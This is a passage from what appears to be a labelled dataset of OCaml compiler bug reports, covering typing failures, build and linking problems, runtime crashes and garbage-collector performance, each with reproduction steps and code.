status\r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\r\n\r\nMany thanks, \r\nKonstantin\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7695\n**Reporter:** copy\n**Assigned to:** @garrigue\n**Status:** resolved (set by @xavierleroy on 2017-12-28T18:37:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n**Has duplicate:** #7766\n**Child of:** #6608\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nThe following code produce a compiler error (\"Fatal error: exception Ctype.Unify(_)\").\r\n\r\nlet _ =\r\n  let arb = QCheck.char in\r\n  let gen = QCheck.Gen.int in\r\n  { arb with gen }\n\n## Steps to reproduce\n\n1. Install qcheck 0.7 (opam install qcheck)\r\n2. Save the code as test.ml\r\n3. Run: ocamlfind ocamlc -c -package qcheck test.ml\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7693\n**Reporter:** @ygrek\n**Status:** acknowledged (set by @damiendoligez on 2018-06-05T14:49:34Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** major\n**Version:** 4.05.0\n**Category:** ocamldoc\n**Monitored by:** @nojb @gasche @dbuenzli\n\n## Bug description\n\nIt seems that `@param id` only works for named arguments, this is not mentioned in the manual afaics. It means when function has unnamed arguments then @param declarations are just ignored, also if named parameter doesn't match @param name the latter is ignored too. I would expect at least a warning when @param is ignored and I would better suggest to never drop user-supplied documentation even if it seems wrong to ocamldoc.\n\n## Steps to reproduce\n\n$ cat a.ml\r\n\r\n(** @param x argument to increment*)\r\nlet unnamed x = x + 1\r\n\r\n(** @param x argument to increment *)\r\nlet named ~x = x + 1\r\n\r\n(** @param x argument to increment *)\r\nlet misnamed ~y = y + 1\r\n\r\nmodule type X = sig\r\n\r\n(** [f1 x]\r\n  @param x argument to increment\r\n  @return result\r\n*)\r\nval f1 : int -> int\r\n\r\n(** [f2 ~x]\r\n  @param x argument to increment\r\n  @return result\r\n*)\r\nval f2 : x:int -> int\r\n\r\n(** [f3 ~x]\r\n  @param x argument to increment\r\n  @return result\r\n*)\r\nval f3 : y:int -> int\r\n\r\nend\r\n\r\n$ ocamldoc a.ml -html\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7692\n**Reporter:** @dra27\n**Assigned to:** @garrigue\n**Status:** assigned (set by @dra27 on 2017-12-19T11:36:25Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Target version:** undecided\n**Category:** typing\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nOn my machine, the following snippet takes 12 seconds to type.\r\n\r\n<pre>\r\ntype _ t =\r\n Â  Â  Â  Â  | T : ('a t -> 'a) t\r\n Â  Â  Â  Â  | End : unit t\r\n\r\nlet rec process : type a . a t -> a = function\r\n| T ->\r\n Â  Â process\r\n| End ->\r\n Â  Â ()\r\n\r\nlet () =\r\n Â process T T T T T T T T T T T T T T T T T T T T\r\n Â  Â  Â  Â  Â (* 1.5 seconds *)\r\n Â  Â  Â  Â  Â T\r\n Â  Â  Â  Â  Â (* 3 seconds *)\r\n Â  Â  Â  Â  Â T\r\n Â  Â  Â  Â  Â (* 6 seconds *)\r\n Â  Â  Â  Â  Â T\r\n Â  Â  Â  Â  Â (* 12 seconds *)\r\n Â  Â  Â  Â  Â T\r\n Â  Â  Â  Â  Â (* and so forth... *)\r\n Â  Â  Â  Â  Â End\r\n</pre>\n\n## Additional information\n\nThis has obviously been reduced from a much larger script (it would even be useful, if it didn't take 30 minutes to type it!).\r\n\r\n(I realise that it's possible that this is simply a pattern which will always be difficult to type)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7691\n**Reporter:** Bertrand.Jeannet\n**Status:** closed (set by @alainfrisch on 2017-12-14T16:16:05Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** major\n**Version:** 4.06.0\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nThe function caml_win32_rename in byterun/win32.c uses the function MoveFileEx, which is not Unicode aware, instead of MoveFileExW which is.\r\n\r\nThis looks like a bug in 4.06, since caml_sys_rename (byterun/sys.c) converts filenames (assumed to be UTF-8) to 16-bits unicode before calling caml_win32_rename.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7690\n**Reporter:** @oandrieu\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2017-12-19T14:24:12Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** standard library\n**Monitored by:** @nojb @gasche @dra27\n\n## Bug description\n\nThere are some overflow issues with the exponent computations in caml_float_of_hex, which results in some invalid conversions. The integer exp variable overflows, which results in the call to ldexp to overflow when it should underflow (and vice versa).\r\n\r\nThe test \"if (e < INT_MIN || e > INT_MAX) return -1;\" is ineffective on Win64 since int and long have the same size there: this results in some difference in behavior between win64 and linux.\r\n\r\nAnd (minor point), the function accept spaces between the 'p' and the exponent digits, whereas strtod and the C99 syntax do not allow spaces there.\n\n## Steps to reproduce\n\n$ cat f.ml\r\nlet hexstring_of_float x =\r\n  Printf.sprintf \"%h\" x\r\n\r\nlet () =\r\n  let s = \r\n    try hexstring_of_float (float_of_string Sys.argv.(1))\r\n    with _ -> \"invalid\" in\r\n  print_endline s\r\n\r\n$ ocamlopt.opt f.ml\r\n\r\n$ ./a.out 0x1.0p-2147483648\r\ninfinity\r\n\r\n$ ./a.out 0x123456789ABCDEF0p2147483647\r\n0x0p+0\r\n\r\n$ ./a.out 0x1p2147483648\r\n-> invalid  on linux64\r\n-> infinity on win64\r\n\r\n$ ./a.out '0x1p 1'\r\n0x1p+1\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7689\r\n**Reporter:** @SkySkimmer\r\n**Assigned to:** @gasche\r\n**Status:** resolved (set by @gasche on 2018-09-12T04:48:18Z)\r\n**Resolution:** duplicate\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Category:** emacs mode\r\n**Duplicate of:** #7844\r\n\r\n## Bug description\r\n\r\nMake a file foo.ml containing (*in*)\r\nOpen in emacs with caml-mode and run imenu\r\nGet error \"caml-match-string: Wrong type argument: integer-or-marker-p, nil\"\r\n"},{"labels":["bug"],"text":"**Original bug ID:** 7688\n**Reporter:** @jhjourdan\n**Assigned to:** @jhjourdan\n**Status:** closed (set by @jhjourdan on 2017-12-11T22:17:28Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** misc\n**Monitored by:** @nojb @gasche @alainfrisch\n\n## Bug description\n\nAt the begining of the makefile is described a \"hard bootstrap procedure\", that is supposed to work even if the set of C primitives used by stdlib has changed.\r\n\r\nHowever, in the current state, the procedure does not work and fails in the last \"coreboot\" phase.\r\n\r\nI think we should solve this issue by either updating the doc of this bootstrap procedure, or even removing it (but then how one should do ?) or fixing the makefile.\r\n\r\nMoreover, I think it would be good to test that this keep working in the future by adding a test in the CI. This is not the first time it breaks.\n\n## Steps to reproduce\n\nIn current trunk:\r\n\r\n$ ./configure\r\n$ make world\r\n<start of hard bootstarp procedure as stated in Makefile:>\r\n$ make coreboot\r\n[add a primitive in the runtime, add call it from the stdlib]\r\n$ make clean runtime coreall\r\n$ make coreboot\r\n< fails with :\r\n     ../boot/ocamlrun ../boot/ocamlc -nostdlib -I ../boot -use-prims ../byterun/primitives -I .. make_opcodes.ml -o make_opcodes\r\n     File \"make_opcodes.ml\", line 1:\r\n     Error: Error while linking ../boot/stdlib.cma(Pervasives):\r\n     The external function `caml_foo' is not available\r\n>\r\n\r\n\r\nFWIW, the changes I made in my test to add the new primitive are:\r\n\r\ndiff --git a/byterun/misc.c b/byterun/misc.c\r\nindex 46e40992b..bd2b7a441 100644\r\n--- a/byterun/misc.c\r\n+++ b/byterun/misc.c\r\n@@ -51,6 +51,11 @@ void caml_set_fields (value v, unsigned long start, unsigned long filler)\r\n \r\n #endif /* DEBUG */\r\n \r\n+CAMLprim value caml_foo(value x)\r\n+{\r\n+  return x;\r\n+}\r\n+\r\n uintnat caml_verb_gc = 0;\r\n \r\n void caml_gc_message (int level, char *msg, ...)\r\ndiff --git a/stdlib/pervasives.ml b/stdlib/pervasives.ml\r\nindex faa421871..69b2cdb78 100644\r\n--- a/stdlib/pervasives.ml\r\n+++ b/stdlib/pervasives.ml\r\n@@ -546,3 +546,9 @@ let exit retcode =\r\n   sys_exit retcode\r\n \r\n let _ = register_named_value \"Pervasives.do_at_exit\" do_at_exit\r\n+\r\n+\r\n+\r\n+\r\n+external foo : int -> int = \"caml_foo\"\r\n+let _ = ignore (foo 5)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7687\n**Reporter:** @dbuenzli\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-04-17T10:55:58Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** compiler driver\n**Monitored by:** @nojb @gasche @yallop @dbuenzli\n\n## Bug description\n\nThe manual [0] mandates these flags to be used for any compilation unit one wants to compile against the thread or vmthread libraries which entails library specific compilation logic to be implemented by build systems.\r\n\r\nI turns out (see discussion in  [1]) that these flags currently have no effect beyond altering the search path for includes and libraries which can perfectly be handled by the scheme(s) we have for compiling against a given library. \r\n\r\nFurther discussion in [1] seems to indicate there is no strong wish to change that state of affairs.\r\n\r\nAs such it would be good if \r\n\r\n1) These flags are marked as deprecated in the compiler driver\r\n2) The documentation is updated to no longer mandate these flags to be added on the cli when the threads or vmthread library are used.\r\n\r\n[0] http://caml.inria.fr/pub/docs/manual-ocaml/libthreads.html\r\n[1] https://github.com/ocaml/ocaml/pull/1504\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7686\r\n**Reporter:** grueni\r\n**Status:** acknowledged (set by @xavierleroy on 2017-12-20T16:15:22Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Platform:** OpenIndiana\r\n**OS:** OpenIndiana\r\n**OS Version:** Hipster\r\n**Category:** configure and build/install\r\n\r\n## Bug description\r\n\r\nThe tests should be skipped if not toolchain msvc (or csc) is used.\r\nBut the test is used and fails.\r\nThe test with which is not portable.\r\ncommand -v can be used.\r\n\r\nIn OpenIndiana when csc is missing:\r\ncommand -v csc => 1, which csc => 1\r\n\r\n## Additional information\r\n```diff\r\n--- ocaml-4.06.0/testsuite/tests/lib-dynlink-csharp/Makefile.orig 2017-12-04 16:55:54.081569859 +0000\r\n+++ ocaml-4.06.0/testsuite/tests/lib-dynlink-csharp/Makefile  2017-12-04 16:56:51.089899537 +0000\r\n@@ -40,7 +40,7 @@\r\n .PHONY: bytecode\r\n bytecode:\r\n  @printf \" ... testing 'bytecode':\"\r\n- @if ! $(SUPPORTS_SHARED_LIBRARIES) || ! which $(CSC_COMMAND) >/dev/null 2>&1; \\\r\n+ @if ! $(SUPPORTS_SHARED_LIBRARIES) || which $(CSC_COMMAND) >/dev/null 2>&1; \\\r\n  then \\\r\n    echo \" => skipped\"; \\\r\n  else \\\r\n@@ -55,7 +55,7 @@\r\n .PHONY: bytecode-dll\r\n bytecode-dll:\r\n  @printf \" ... testing 'bytecode-dll':\"\r\n- @if ! $(SUPPORTS_SHARED_LIBRARIES) || ! which $(CSC_COMMAND) > /dev/null 2>&1; \\\r\n+ @if ! $(SUPPORTS_SHARED_LIBRARIES) || which $(CSC_COMMAND) > /dev/null 2>&1; \\\r\n  then \\\r\n    echo \" => skipped\"; \\\r\n  else \\\r\n@@ -73,7 +73,7 @@\r\n native:\r\n  @printf \" ... testing 'native':\"\r\n  @if ! $(SUPPORTS_SHARED_LIBRARIES) || $(BYTECODE_ONLY) \\\r\n-     || ! which $(CSC_COMMAND) > /dev/null 2>&1; then \\\r\n+     ||  which $(CSC_COMMAND) > /dev/null 2>&1; then \\\r\n    echo \" => skipped\"; \\\r\n  else \\\r\n    rm -f main.exe main.dll; \\\r\n@@ -88,7 +88,7 @@\r\n native-dll:\r\n  @printf \" ... testing 'native-dll':\"\r\n  @if ! $(SUPPORTS_SHARED_LIBRARIES) || $(BYTECODE_ONLY) \\\r\n-     || ! which $(CSC_COMMAND) > /dev/null 2>&1; then \\\r\n+     ||  which $(CSC_COMMAND) > /dev/null 2>&1; then \\\r\n    echo \" => skipped\"; \\\r\n  else \\\r\n    rm -f main.exe main_obj.$(O) main.dll; \\\r\n```\r\n## File attachments\r\n\r\n- [a.patch](https://gist.githubusercontent.com/vicuna/3fe71b0db6ae50deb4579eca00de6452/raw/773929862b72ee6e767ef8266888851c84021655/a.patch)\r\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7685\n**Reporter:** grueni\n**Status:** confirmed (set by @xavierleroy on 2017-12-20T16:20:17Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** OpenIndiana\n**OS:** OpenIndiana\n**OS Version:** Hipster\n**Version:** 4.06.0\n**Category:** configure and build/install\n\n## Bug description\n\nThe test fails because the first letter of the result is capitalized.\n\n## Additional information\n\n--- ocaml-4.06.0/testsuite/tests/basic/float.reference.orig 2017-12-04 18:33:56.140895262 +0000\r\n+++ ocaml-4.06.0/testsuite/tests/basic/float.reference  2017-12-04 18:34:06.093706170 +0000\r\n@@ -1 +1 @@\r\n-1./.0. = inf\r\n+1./.0. = Inf\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7684\n**Reporter:** Iguernlala\n**Status:** acknowledged (set by @gasche on 2017-12-01T21:06:14Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Category:** misc\n**Monitored by:** @nojb\n\n## Bug description\n\nThis happens with mutually recursive modules as shown in the example below. Module X1 is used in module M, and module M is exported in the interface. But, if warning 60 is set, an \"unused module X1\" warning is triggered when compiling as follows:\r\n\r\n$ ocamlc -c -w +60 foo.mli foo.ml\r\n\r\nFile \"foo.ml\", line 8, characters 0-43:\r\nWarning 60: unused module X1.\r\n\r\n(* content of foo.ml *)\r\nmodule type S = sig\r\n  type t\r\nend\r\n\r\nmodule rec M : S = struct\r\n  type t = X1 of X1.t\r\nend\r\nand X1 : S = struct\r\n  type t = M.t list\r\nend\r\n\r\n\r\n(* content of foo.mli *)\r\nmodule type S = sig\r\n  type t\r\nend\r\n\r\nmodule M : S\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7683\n**Reporter:** @chambart\n**Status:** confirmed (set by @mshinwell on 2017-12-06T17:08:41Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @nojb @gasche @alainfrisch\n\n## Bug description\n\nIn closure.ml the Uvar constructor is supposed to be pure by 'is_simple_argument', but when the variable is mutable this\r\ncan be wrong.\n\n## Steps to reproduce\n\nThis program exhibit the problem, it returns 1 in bytecode and flambda and 2 with closure.\r\n\r\nlet f () n () =\r\n  n\r\n\r\nlet g () =\r\n  let r = ref 0 in\r\n  f (incr r) !r (incr r)\r\n\r\nlet () = print_int (g ())\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7681\n**Reporter:** @nojb\n**Status:** acknowledged (set by @xavierleroy on 2017-12-20T16:57:36Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** runtime system and C interface\n**Monitored by:** @gasche @alainfrisch\n\n## Bug description\n\nWe recently encountered a segfault caused by a 32-bit gcc using -malign-double by default. This option means that all doubles are assumed aligned by gcc, a hypothesis that is typically false for doubles allocated in the OCaml heap.\r\n\r\nWe saw this problem with i686-w64-mingw32-gcc 6.4.0 under Windows (which activates the -malign-double option by default) with high enough optimisations (\"-msse2 -O3\").\r\n\r\nFor correctness it seems it would be best to pass -mno-align-double explicitly to all 32-bit gcc targets (or at the very least for the mingw targets).\n\n## Steps to reproduce\n\n(see attached daxpy.c and crash.ml)\r\n\r\n$ ocamlc -ccopt -msse2 -ccopt -O3 -ccopt -malign-double -c daxpy.c\r\n$ ocamlopt daxpy.o crash.ml\r\n$ ./a.out\r\na=0xb7ce0f34\r\nSegmentation fault (core dumped)\r\n$ ocamlc -ccopt -msse2 -ccopt -O3 -mno-align-double -c daxpy.c\r\n$ ocamlopt daxpy.o crash.ml\r\n$ ./a.out\r\na=0xb7cbdf34\r\n$\n\n## File attachments\n\n- [crash.ml](https://gist.githubusercontent.com/vicuna/2531b295e8e88da3bdc924b6acc5279b/raw/a716b7bb941c442af4f09dbe5a38f41a9e8e3c81/crash.ml)\n- [daxpy.c](https://gist.githubusercontent.com/vicuna/2531b295e8e88da3bdc924b6acc5279b/raw/9ed793ffbe6b19e3e63c931c0f440ed3c865e3fb/daxpy.c)\n- [daxpy.s.diff](https://gist.githubusercontent.com/vicuna/2531b295e8e88da3bdc924b6acc5279b/raw/4db0d551f754a87f17d3ee891283a350babd276c/daxpy.s.diff)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7680\n**Reporter:** vlaviron\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-12-06T06:57:15Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @alainfrisch\n\n## Bug description\n\nCompilation of match ... with exception ... uses Lambda.next_negative_raise_count instead of Lambda.next_raise_count because it generates a Lstaticraise that jumps from inside a Ltrywith block to outside it, and Simplif.simplify_exits is not allowed to move the handler's code inside the trywith block.\r\nThe optimisation for compilation of let-bindings of tuples in Matching.for_let can also generate Lstaticraise that jumps outside a Ltrywith block, but it doesn't use a negative raise count so in some cases Simplif.simplify_exits can produce incorrect code.\n\n## Steps to reproduce\n\n$ cat bug.ml\r\nlet f () =\r\n  let (a,b) =\r\n    try (1,2)\r\n    with _ -> assert false\r\n  in\r\n  if a + b = 3 then raise Not_found\r\n\r\nlet _ = try f () with Not_found -> print_endline \"Ok\"\r\n$ ocamlc -o bug bug.ml\r\n$ ./bug\r\nFatal error: exception Assert_failure(\"bug.ml\", 4, 14)\n\n## Additional information\n\nFound while updating #1482.\r\nThe bug is present since 4.03.0, and the corresponding feature is listed in Changes as '#4800: better compilation of tuple assignment'.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7679\n**Reporter:** @ejgallego\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-11-28T17:23:49Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** major\n**Platform:** Linux\n**OS:** Ubuntu\n**OS Version:** 17.04\n**Version:** 4.06.0\n**Category:** configure and build/install\n**Monitored by:** @gasche\n\n## Bug description\n\nDear Ocaml devs,\r\n\r\ntrying to compile 4.06.0 in 32bit mode [so it can be used by js_of_ocaml] I hit this compilation problem:\r\n\r\n./configure -with-debug-runtime -cc \"gcc -m32\" -as \"as --32\" -aspp \"gcc -m32 -c\" -host \"i386-linux\" -partialld \"ld -r -melf_i386\"\r\n\r\n....\r\n\r\nboot/ocamlrun ./ocamlopt -g -nostdlib -I stdlib -I otherlibs/dynlink  -o ocamlc.opt compilerlibs/ocamlcommon.cmxa compilerlibs/ocamlbytecomp.cmxa driver/main.cmx -cclib \"-lm  -ldl  -lpthread                  \"\r\nstdlib/libasmrun.a(i386.o): In function `caml_system__code_begin':\r\n(.text+0x0): multiple definition of `caml_system__code_begin'\r\nstdlib/libasmrun.a(amd64.o):(.text+0x0): first defined here\r\n....\r\n/usr/bin/ld: i386:x86-64 architecture of input file `stdlib/libasmrun.a(amd64.o)' is incompatible with i386 output\r\ncollect2: error: ld returned 1 exit status\r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\r\nMakefile:883: recipe for target 'ocamlc.opt' failed\r\n\r\nIt could be well the case that I am doing something wrong, as I am using the configure line that worked for 4.05.0. 4.05.0 in 32 bits mode works ok in my system.\n\n## Steps to reproduce\n\n- clone 4.06 branch\r\n- ./configure -with-debug-runtime -cc \"gcc -m32\" -as \"as --32\" -aspp \"gcc -m32 -c\" -host \"i386-linux\" -partialld \"ld -r -melf_i386\"\r\n- make world\r\n- make world.opt => fail\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7678\n**Reporter:** @dbuenzli\n**Status:** acknowledged (set by @xavierleroy on 2017-11-26T16:21:45Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**OS:** Linux\n**Version:** 4.06.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** compiler driver\n**Monitored by:** @gasche @yallop @dra27 @dbuenzli\n\n## Bug description\n\nI don't know if that is intended but it seems that `-fPIC` is not passed in the second case. \r\n\r\nThis makes `ocamlmklib` to fail to produce libraries for C object files generated with ocamlopt -c.\n\n## Steps to reproduce\n\n# Our C file \r\n> cat a.c\r\n#include <stdlib.h>\r\nchar *get_editor (void) { return getenv(\"EDITOR\"); }\r\n\r\n# Here all is well\r\n> ocamlc -verbose -c a.c \r\n+ gcc -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -fno-builtin-memcmp -fPIC -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c    -I'/home/dbuenzli/.opam/default/lib/ocaml' 'a.c'\r\n> ocamlmklib a.o\r\n\r\n# Here we fail note the missing `-fPIC` w.r.t above invocation\r\n> ocamlopt -verbose -c a.c \r\n+ gcc -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -fno-builtin-memcmp -D_FILE_OFFSET_BITS=64 -D_REENTRANT   -c    -I'/home/dbuenzli/.opam/default/lib/ocaml' 'a.c'\n\n## Additional information\n\n> cat /etc/system-release\r\nCentOS Linux release 7.4.1708 (Core) \r\n\r\n> ocamlc -config \r\n ocamlc -config \r\nversion: 4.06.0\r\nstandard_library_default: /home/dbuenzli/.opam/default/lib/ocaml\r\nstandard_library: /home/dbuenzli/.opam/default/lib/ocaml\r\nstandard_runtime: /home/dbuenzli/.opam/default/bin/ocamlrun\r\nccomp_type: cc\r\nc_compiler: gcc\r\nocamlc_cflags: -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -fno-builtin-memcmp -fPIC\r\nocamlc_cppflags: -D_FILE_OFFSET_BITS=64 -D_REENTRANT\r\nocamlopt_cflags: -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -fno-builtin-memcmp\r\nocamlopt_cppflags: -D_FILE_OFFSET_BITS=64 -D_REENTRANT\r\nbytecomp_c_compiler: gcc -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -fno-builtin-memcmp -fPIC -D_FILE_OFFSET_BITS=64 -D_REENTRANT\r\nnative_c_compiler: gcc -std=gnu99 -O2 -fno-strict-aliasing -fwrapv -fno-builtin-memcmp -D_FILE_OFFSET_BITS=64 -D_REENTRANT\r\nbytecomp_c_libraries: -lm  -ldl -lcurses -lpthread                  \r\nnative_c_libraries: -lm  -ldl\r\nnative_pack_linker: ld -r -o \r\nranlib: ranlib\r\ncc_profile: -pg\r\narchitecture: amd64\r\nmodel: default\r\nint_size: 63\r\nword_size: 64\r\nsystem: linux\r\nasm: as\r\nasm_cfi_supported: true\r\nwith_frame_pointers: false\r\next_exe: \r\next_obj: .o\r\next_asm: .s\r\next_lib: .a\r\next_dll: .so\r\nos_type: Unix\r\ndefault_executable_name: a.out\r\nsysthread_supported: true\r\nhost: x86_64-unknown-linux-gnu\r\ntarget: x86_64-unknown-linux-gnu\r\nprofiling: true\r\nflambda: false\r\nspacetime: false\r\nsafe_string: false\r\ndefault_safe_string: true\r\nflat_float_array: true\r\nafl_instrument: false\r\nwindows_unicode: false\r\nexec_magic_number: Caml1999X011\r\ncmi_magic_number: Caml1999I022\r\ncmo_magic_number: Caml1999O022\r\ncma_magic_number: Caml1999A022\r\ncmx_magic_number: Caml1999Y022\r\ncmxa_magic_number: Caml1999Z022\r\nast_impl_magic_number: Caml1999M022\r\nast_intf_magic_number: Caml1999N022\r\ncmxs_magic_number: Caml1999D022\r\ncmt_magic_number: Caml1999T022\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7677\n**Reporter:** @dbuenzli\n**Status:** acknowledged (set by @xavierleroy on 2017-11-26T16:25:09Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** documentation\n**Monitored by:** @dbuenzli @Yakobowski\n\n## Bug description\n\nThe release notes of 4.04.0 point to \r\n\r\n https://github.com/ocaml/ocaml/commit/da56cf6dfdc13c09905c2e07f1d4849c8346eec8\r\n\r\nas explaining that. However it seems that part of this work was invalidated by: \r\n\r\nhttps://github.com/ocaml/ocaml/pull/761\r\n\r\nand nowadays trying to use `ocamlc -o DEST -c file.c` results in the following error: \r\n\r\n  Options -c and -o are incompatible when compiling C files\r\n\r\nIt seems build systems using ocaml are doomed for life to need to move the produced `file.o` manually from the `cwd` to the desired destination directory.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7676\n**Reporter:** @alainfrisch\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @damiendoligez on 2018-11-13T12:31:33Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** runtime system and C interface\n**Related to:** #4108 #6133 #6294 #6962\n**Monitored by:** @ygrek @dbuenzli @Yakobowski\n\n## Bug description\n\nCustom blocks allocated in or moved to the major heap add some \"pressure\" to trigger a major GC slice.  The current criterion is such that a GC slice is triggered more often if the size of the major heap grows.  This can result is noticeable slowdown.\r\n\r\nThe function implementing this strategy is:\r\n\r\n<pre>\r\nCAMLexport void caml_adjust_gc_speed (mlsize_t res, mlsize_t max)\r\n{\r\n  if (max == 0) max = 1;\r\n  if (res > max) res = max;\r\n  caml_extra_heap_resources += (double) res / (double) max;\r\n  if (caml_extra_heap_resources > 1.0){\r\n    CAML_INSTR_INT (\"request_major/adjust_gc_speed_1@\", 1);\r\n    caml_extra_heap_resources = 1.0;\r\n    caml_request_major_slice ();\r\n  }\r\n  if (caml_extra_heap_resources\r\n           > (double) caml_minor_heap_wsz / 2.0\r\n             / (double) caml_stat_heap_wsz) {\r\n    CAML_INSTR_INT (\"request_major/adjust_gc_speed_2@\", 1);\r\n    caml_request_major_slice ();\r\n  }\r\n}\r\n</pre>\r\n\r\nThe second criterion becomes easier and easier to satisfy as the size of the major heap grows.  It is not clear to me why the ratio of the size of the minor and major heaps is taken into account, nor why the constant 2 was chosen.\r\n\r\nSee below for a program that illustrates the behavior.  It runs two computations starting from different heap sizes.  The first one allocates a large block (in the major heap), then does many small allocations (to trigger a minor GC).  The second one create an in_channel (which is a custom block, with a \"pressure ratio\" of 1/1000, i.e. one asks to force a full GC cycle every 1000 allocations).  The timings are:\r\n\r\n<pre>\r\nn =     2000 => 0.22s / 0.23s\r\nn =     4000 => 0.22s / 0.35s\r\nn =     6000 => 0.23s / 0.47s\r\nn =     8000 => 0.22s / 0.73s\r\nn =    10000 => 0.26s / 0.88s\r\nn =    12000 => 0.23s / 1.06s\r\nn =    14000 => 0.23s / 1.02s\r\nn =    16000 => 0.24s / 1.19s\r\nn =    18000 => 0.23s / 1.35s\r\nn =    20000 => 0.25s / 1.30s\r\nn =    22000 => 0.28s / 1.55s\r\nn =    24000 => 0.25s / 1.83s\r\nn =    26000 => 0.26s / 1.60s\r\nn =    28000 => 0.23s / 1.88s\r\nn =    30000 => 0.23s / 1.82s\r\nn =    32000 => 0.25s / 2.79s\r\nn =    34000 => 0.25s / 2.12s\r\nn =    36000 => 0.23s / 2.66s\r\nn =    38000 => 0.21s / 2.52s\r\nn =    40000 => 0.25s / 2.38s\r\n</pre>\r\n\r\nn is proportional to the size of the initial heap.  One sees clearly that the speed of the first computation does not depend on the heap size, while the speed of the second one is directly impacted.\r\n\r\nThe marginal cost of opening a channel raises to about 2ms and would continue to grow with larger major heaps.\r\n\r\nThis specific problem with in_channel could be addressed in part by reducing the ratio 1/1000, but the real issue here might be with the criterion above, which impacts all kinds of custom objects (that add \"pressure\").\n\n## Additional information\n\n<pre>\r\nlet a = ref [||]\r\n\r\nlet test n =\r\n  (* Force the major heap to grow *)\r\n  Gc.compact ();\r\n  a := Array.init n (fun _ -> Array.make 10000 0);\r\n  Gc.compact ();\r\n  let t0 = Sys.time () in\r\n  (* First, try with allocating an array -> the speed of\r\n     this is independent of the initial size of the major heap. *)\r\n  for i = 1 to 1000 do\r\n    let a = Array.make 4096 0 in\r\n    (* Enough allocation to trigger a minor GC *)\r\n    for _j = 1 to 1024 do ignore (Array.make 256 0) done;\r\n    a.(0) <- i\r\n  done;\r\n  let t1 = Sys.time () in\r\n  Gc.compact ();\r\n  let t2 = Sys.time () in\r\n  (* Second, try with allocating a custom (here, an in_channel) ->\r\n     this becomes slower as the heap grows. *)\r\n  for i = 1 to 1000 do\r\n    let ic = open_in \"foobar\" in\r\n    (* Enough allocation to trigger a minor GC *)\r\n    for _j = 1 to 1024 do ignore (Array.make 256 0) done;\r\n    close_in ic;\r\n  done;\r\n  let t3 = Sys.time () in\r\n  Printf.printf \"n = % 8i => %.02fs / %.02fs\\n%!\" n (t1 -. t0) (t3 -. t2)\r\n\r\n\r\nlet () =\r\n  let oc = open_out \"foobar\" in close_out oc;\r\n  for i = 1 to 20 do\r\n    test (i * 2000)\r\n  done\r\n</pre>\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7675\n**Reporter:** @damiendoligez\n**Status:** resolved (set by @xavierleroy on 2017-11-21T16:06:56Z)\n**Resolution:** not a bug\n**Priority:** urgent\n**Severity:** 